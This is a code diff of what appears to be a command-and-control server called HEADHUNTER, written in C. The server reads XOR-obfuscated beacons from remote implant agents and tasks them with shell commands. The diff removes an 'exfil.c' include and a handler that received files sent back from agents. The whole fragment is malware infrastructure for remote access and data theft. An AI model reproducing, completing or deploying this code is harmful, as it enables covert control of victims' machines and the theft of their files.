@@ -6,7 +6,6 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/time.h>
-#include "exfil.c"
 
 extern char* key;
 extern int keylen;
@@ -158,16 +157,8 @@ void *Socket_Reader(){
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
 
-	xorbuffer = XOR(buffer, key, n, keylen);
-	if(str_starts_with(xorbuffer, "--HUNTER DOWNLOAD--") == 0){
-		char* xorconfirm = XOR("OK", key, 5, keylen);
-		write(a.dest, xorconfirm, 5);
-		free(xorconfirm);
-		recvfile("out.hunter", a.dest, key);
-		continue;
-
-	}
-	else if(str_starts_with(xorbuffer, "--HEADHUNTER BEACON--") == 0){
+	    xorbuffer = XOR(buffer, key, n, keylen);
+	    if(str_starts_with(xorbuffer, "--HEADHUNTER BEACON--") == 0){
         
 		for(int i = 0; i < max_clients; i++){
 	    	    if(client_socket[i] == a.dest){
@@ -277,12 +268,18 @@ void *Socket_Writer()
 	}
 
 	else {
-	
+
+	    if(str_starts_with(buffer, "shell") == 0){ 	
 	    
-	    printf("\n\e[1;32m[+]\e[0m Tasking agent with command\n");
-	    a.beaconbufsize = n;
-	    a.beaconbuf = buffer;
-          
+	    	printf("\n\e[1;32m[+]\e[0m Tasking agent with command\n");
+	   	a.beaconbufsize = n;
+	   	a.beaconbuf = buffer;
+            }
+	    else{
+		printf("Invalid command, type \"help\" to list commands\n");
+		printf("beacon> ");
+		fflush(NULL);
+	    }
 	    //free(xorbuffer);
         }
     }
